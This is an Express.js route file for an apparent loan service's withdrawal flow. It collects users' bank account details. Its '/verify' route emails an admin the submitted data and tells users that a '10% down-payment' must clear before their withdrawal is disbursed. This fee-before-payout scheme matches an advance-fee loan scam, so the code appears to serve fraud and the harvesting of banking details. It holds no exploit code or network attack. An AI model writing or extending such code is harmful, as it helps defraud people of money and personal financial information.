// apexloanserver/routes/withdraw.js
const express = require('express');
const router = express.Router();
const { sendNotification } = require('../utils/emailNotifier');

router.post('/request', async (req, res) => {
  try {
    const { amount, bankName, accountName, accountNumber, reference } = req.body;
    if (amount < 5000) return res.status(400).json({ message: "Minimum withdraw is R5000" });
    res.json({
      amount,
      bankName,
      accountName,
      accountNumber,
      reference,
      note: `Tick the checkbox below to confirm that your banking details are correct. By confirming, you acknowledge that the provided banking details are correct and up-to-date.`
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

router.post('/verify', async (req, res) => {
  try {
    // Notify admin of withdraw confirmation
    sendNotification("Withdraw Confirmation", `User has verified withdraw down-payment. Details: ${JSON.stringify(req.body)}`);
    res.json({ message: "Thanks for verifying the payment. The management is verifying your payment. If the 10% down-payment is successful, the withdrawal will be disbursed along with the down-payment." });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

module.exports = router;
